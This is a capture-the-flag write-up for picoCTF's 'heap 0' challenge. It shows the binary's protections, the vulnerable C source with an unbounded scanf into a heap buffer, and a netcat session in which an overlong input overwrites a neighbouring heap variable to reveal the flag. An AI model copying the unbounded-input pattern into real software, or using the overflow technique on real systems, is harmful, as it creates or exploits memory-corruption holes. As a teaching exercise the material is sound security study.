# [Pwn] heap 0

## 💡 Challenge Description

> *Are overflows just a stack concern?*

## 🔒 ELF Properties

```
rydzze ~ ❯ file chall
chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
BuildID[sha1]=2015ade3c2b89f5069cb8c54dd750d1b9849062d, for GNU/Linux 3.2.0, with debug_info, not stripped

rydzze ~ ❯ checksec --file=chall
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   53 Symbols        No    0               2               chall
```

## ✨ Walkthrough

```
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data
+-------------+----------------+
[*]   0x5d680dc912b0  ->   pico
+-------------+----------------+
[*]   0x5d680dc912d0  ->   bico
+-------------+----------------+
```

During the program initialisation, we could see that the `input_data` and `safe_var` variables are holding the value `pico` and `bico` respectively.

```c
void check_win() {
    if (strcmp(safe_var, "bico") != 0) {
        printf("\nYOU WIN\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

        exit(0);
    } else {
        printf("Looks like everything is still secure!\n");
        printf("\nNo flage for you :(\n");
        fflush(stdout);
    }
}
```

Based on the source code given, the `check_win` function wouldn't print out the flag as long the value of `safe_var` is `bico`.

To obtain the flag, we have to overwrite the value stored inside the `safe_var` variable which resides within the heap so that the program will print out the flag.

```c
    void write_buffer() {
        printf("Data for buffer: ");
        fflush(stdout);
        scanf("%s", input_data);
    }
```

When we look at the `write_buffer` function, the `scanf("%s", input_data);` does not limit input size, allowing users to **overwrite memory past input_data**. This is known as heap overflow vulnerability. All we have to do is to overflow the input until we overwrite the `safe_var`.

## 🛠 Exploit

```
rydzze ~ ❯ nc tethys.picoctf.net 65181

Welcome to heap0!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data
+-------------+----------------+
[*]   0x56089ada0720  ->   pico
+-------------+----------------+
[*]   0x56089ada0740  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 2
Data for buffer: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 1
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data
+-------------+----------------+
[*]   0x56089ada0720  ->   aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+-------------+----------------+
[*]   0x56089ada0740  ->   aaaaaaaaaaaaaaaaaaaaaaaaaaa
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
picoCTF{REDACTED}
```